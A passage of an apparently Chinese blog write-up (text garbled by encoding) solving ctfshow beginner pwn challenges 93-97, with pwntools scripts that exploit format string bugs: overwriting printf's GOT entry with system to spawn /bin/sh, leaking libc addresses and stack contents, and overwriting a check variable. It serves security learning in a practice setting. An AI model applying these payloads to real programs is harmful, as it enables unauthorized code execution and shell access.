		alt="exit0å‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="259"
		data-flex-basis="622px"
	
></p>
<p>è¿™é¢˜å¾ˆç®€å•ï¼Œè¾“å…¥7å°±æœ‰flagï¼Œä½†æˆ‘ä»¬é‡åœ¨ç†è§£è¿™é“é¢˜ï¼Œå¯ä»¥æ¯ä¸ªèœå•éƒ½æŸ¥çœ‹ä¸€ä¸‹ï¼Œäº†è§£FMTçš„åŸç†ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ã€è®¡é‡å€¼ç­‰ç­‰ï¼‰ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span>  <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28283</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;7&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_094">PWN_094
</h3><p>é¢˜ç›®ï¼šå¥½äº†ï¼Œä½ å·²ç»å­¦ä¼š1+1=2äº†ï¼Œæ¥ä¸‹æ¥ç»§ç»­åŠ æ²¹å§ã€‚</p>
<p>checksecï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/308.png"
	width="918"
	height="230"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/308_hu_4711b42b5991fb54.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/308_hu_e5407c79929fe7c8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="399"
		data-flex-basis="957px"
	
></p>
<p>32ä½å¼€å¯NXï¼Œéƒ¨åˆ†å¼€å¯RELROã€‚</p>
<p>IDA32ä½åˆ†æctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/309.png"
	width="685"
	height="261"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/309_hu_eeda70061047298e.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/309_hu_6b3ef1d3a4e5406.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="262"
		data-flex-basis="629px"
	
></p>
<p>è¿›å…¥ä¸€ä¸ªå¾ªç¯ï¼Œç„¶åå…¶ä¸­æœ‰æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼›å‡½æ•°ç›®å½•åˆæ‰¾åˆ°ä¸€ä¸ªsyså‡½æ•°ï¼š</p>
<p><img src="310.png" alt="syså‡½æ•°" style="zoom:150%;" />è¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå°†printf@got æŒ‡é’ˆæŒ‡å‘çš„åœ°å€æ”¹ä¸º system@pltåœ¨printf(),å°±ç›¸å½“äºsystem()äº†ï¼Œç„¶åå€Ÿreadå‡½æ•°å°†bufè¯»è¿›systemé‡Œï¼Œè¿™ä¸ªbufæˆ‘ä»¬å¯ä»¥è¾“è¿›<code>/bin/sh</code>ï¼Œè¿™å°±æ„æˆä¸€ä¸ªåé—¨å‡½æ•°å•¦ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./fmt&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28201</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl"><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">system_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,{</span><span class="n">printf_got</span><span class="p">:</span><span class="n">system_plt</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_095">PWN_095
</h3><p>é¢˜ç›®ï¼šåŠ å¤§äº†ä¸€ç‚¹ç‚¹éš¾åº¦ï¼Œä¸è¿‡å¯¹ä½ æ¥è¯´è¿˜æ˜¯so easy å§ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/311.png"
	width="864"
	height="224"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/311_hu_e8402ac4c6017989.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/311_hu_b83cc0173e401067.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="385"
		data-flex-basis="925px"
	
></p>
<p>IDAåˆ†æï¼Œè·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/312.png"
	width="585"
	height="289"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/312_hu_b357679ac0250690.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/312_hu_7c97b1b0794a0683.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="485px"
	
></p>
<p>è¿™é‡Œçœ‹å¾ˆæ˜æ˜¾å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè€Œä¸”æˆ‘æ‰¾ä¸åˆ°systemå‡½æ•°å’Œ/bin/shä¹‹ç±»çš„ï¼Œåªèƒ½è‡ªå·±æ„é€ äº†ï¼Œé‚£å°±ä¼šç”¨åˆ°ret2libcæ–¹é¢çš„çŸ¥è¯†ï¼Œéœ€è¦å¾—å‡ºåŸºåœ°å€æ‰èƒ½åæ¨å‡ºåé—¨å‡½æ•°çš„åœ°å€ã€‚</p>
<p>å¤§è‡´æ€è·¯å°±æ˜¯æ³„éœ²å‡ºä¸€ä¸ªå‡½æ•°çš„åœ°å€ç„¶åå¾—åˆ°å¯¹åº”çš„libcç‰ˆæœ¬ï¼Œåˆ©ç”¨è¿™ä¸ªç‰ˆæœ¬å»å¾—å‡ºåé—¨å‡½æ•°å’Œè¢«æ³„éœ²å‡½æ•°çš„åç§»é‡ï¼Œåˆ©ç”¨è¿™ä¸ªè¢«æ³„éœ²å‡½æ•°çš„åç§»é‡ç®—å‡ºè¿™ä¸ªç¨‹åºçš„åŸºåœ°å€ï¼Œåˆ©ç”¨è¿™ä¸ªåŸºåœ°å€å’Œlibcçš„åé—¨å‡½æ•°åç§»é‡å°±èƒ½å¾—å‡ºè¿™ä¸ªåé—¨å‡½æ•°åœ¨è¿™ä¸ªç¨‹åºçš„çœŸå®åœ°å€å¹¶æˆåŠŸå®ç°è°ƒç”¨ã€‚</p>
<p>æ‰¾æ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»é‡ï¼š6</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/313.png"
	width="1344"
	height="484"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/313_hu_86e18a39911688df.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/313_hu_ae5ad0ad42eed09b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="277"
		data-flex-basis="666px"
	
></p>
<p>æˆ‘ä»¬å°±æ³„éœ²printfå‡½æ•°å§ï¼Œæ‰¾å®ƒçš„çœŸå®åœ°å€ï¼Œpayloadï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;%6$s&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">printf</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xf7</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:])</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>expï¼ˆpython3ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28247</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;%6$s&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">printf</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xf7</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;printf&#39;</span><span class="p">,</span><span class="n">printf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">printf</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;printf&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">printf_got</span><span class="p">:</span><span class="n">system</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_096">PWN_096
</h3><p>é¢˜ç›®ï¼šå…ˆæ‰¾ä¸€ä¸‹åç§»ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/314.png"
	width="855"
	height="230"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/314_hu_ff254f8acba1b14c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/314_hu_c28da2a86ef57625.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="371"
		data-flex-basis="892px"
	
></p>
<p>IDAåˆ†æï¼š
<img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/315.png"
	width="1325"
	height="639"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/315_hu_856b269bce611e12.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/315_hu_7c46c18a06353cb.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="207"
		data-flex-basis="497px"
	
></p>
<p>ç„¶åè¿è¡Œä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/316.png"
	width="1345"
	height="670"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/316_hu_5c08530ca15cc69b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/316_hu_8fdb88b05022651c.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="200"
		data-flex-basis="481px"
	
></p>
<p>å¯ä»¥ç¡®å®šè¿™æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘è¾“å…¥ä¸€ä¸ªå‚æ•°ï¼Œprintfå°±ä¼šåŒæ ·è¾“å‡ºæ¥ã€‚æŸ¥çœ‹åç§»ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/317.png"
	width="1660"
	height="345"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/317_hu_eb20d960fd4467a0.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/317_hu_198607be8cf50b9a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="481"
		data-flex-basis="1154px"
	
></p>
<p>ä½ å¯ä»¥å‘ç°ä½ æ³¨å…¥è®¸å¤š%på¾ˆéš¾æ‰¾åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»é‡ã€‚ä½ æ‹‰å»è§£ç å°±ä¼šå‘ç°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/318.png"
	width="1235"
	height="621"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/318_hu_9c0699fa7a25d4e9.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/318_hu_d9afef6eb934449b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="477px"
	
></p>
<p>æœ‰çœ‹åˆ°ctfshow_flagçš„flag{}åŒ…å¤´</p>
<p>IDAåˆ†æé‚£é‡Œå‘Šè¯‰æˆ‘ä»¬flagåœ¨æ ˆä¸Šï¼Œç„¶åé€šè¿‡ä¸‹é¢printfå»æ˜¾ç¤ºflagï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æ³„æ¼å°±è¡Œäº†ï¼Œç”±äºå†…å­˜æ˜¯å°ç«¯å­˜å‚¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å€’åºè¾“å‡ºã€‚ä»¥ä¸‹æ˜¯ç”¨(python2)expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28299</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">6</span><span class="o">+</span><span class="mi">12</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="o">=</span><span class="s1">&#39;%</span><span class="si">{}</span><span class="s1">$p&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;$ &#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">aim</span> <span class="o">=</span> <span class="n">unhex</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span> <span class="n">aim</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_097">PWN_097
</h3><p>é¢˜ç›®ï¼šè¦†å†™æŸä¸ªå€¼æ»¡è¶³æŸæ¡ä»¶å¥½åƒå°±å¯ä»¥äº†ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/319.png"
	width="870"
	height="206"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/319_hu_59fca6a6b436c8da.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/319_hu_2985ebc15ac64128.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="422"
		data-flex-basis="1013px"
	
></p>
<p>IDA32ä½åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/320.png"
	width="1294"
	height="651"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/320_hu_bb39267d406e862.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/320_hu_f770ce977277fc7.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="477px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/321.png"
	width="830"
	height="153"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/321_hu_1d74c339e1c32681.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/321_hu_a2a7ca43f90eda1e.png 1024w"
	loading="lazy"
	
		alt="get_flagå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="542"
		data-flex-basis="1301px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/322.png"
	width="835"
	height="354"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/322_hu_6fcf320369b8be66.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/322_hu_5d14b21da709aa76.png 1024w"
	loading="lazy"
	
		alt="flagå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="235"
		data-flex-basis="566px"
	
></p>
<p>è¿™é‡Œå¯¹checkæœ‰ä¸€ä¸ªæ£€æŸ¥ï¼Œå˜é‡ check è¢«ç”¨ä½œæ¡ä»¶åˆ¤æ–­ã€‚å¦‚æœ check çš„å€¼ä¸ºéé›¶ï¼ˆçœŸå€¼ï¼‰ï¼Œåˆ™ä¼šæ‰§è¡Œç‰¹æƒå‡çº§çš„æ¶ˆæ¯è¾“å‡ºå’Œå‘½ä»¤æç¤ºï¼Œç„¶åè°ƒç”¨ flag() å‡½æ•°ã€‚å¦åˆ™ï¼Œå¦‚æœ check çš„å€¼ä¸ºé›¶ï¼ˆå‡å€¼ï¼‰ï¼Œåˆ™ä¼šè¾“å‡º &ldquo;Permission denied.&rdquo; æ¶ˆæ¯ã€‚ä¹Ÿå°±æ˜¯è¯´check==1å°±å¯ä»¥getshelläº†ï¼Œè€Œä¸”è¿™é‡Œä¹Ÿæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p>
<p>è·Ÿè¿›checkï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/323.png"
	width="950"
	height="100"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/323_hu_9c00fa459fa8b02d.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/323_hu_aed50a3921d8bba0.png 1024w"
	loading="lazy"
	
		alt=".bsså­—æ®µ:0x804B040"
	
	
		class="gallery-image" 
		data-flex-grow="950"
		data-flex-basis="2280px"
	
></p>
<p>å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å»ä¿®æ”¹ä»»æ„åœ°å€ã€‚</p>
<p>æ‰¾æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»é‡ï¼š11</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/324.png"
	width="1645"
	height="639"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/324_hu_596c7acfea4193f4.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/324_hu_e3ce73c65a491458.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="257"
		data-flex-basis="617px"
	
></p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28231</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">check</span> <span class="o">=</span> <span class="mh">0x804B040</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#34;./pwn&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="p">{</span><span class="n">check</span><span class="p">:</span><span class="mi">1</span><span class="p">})</span>
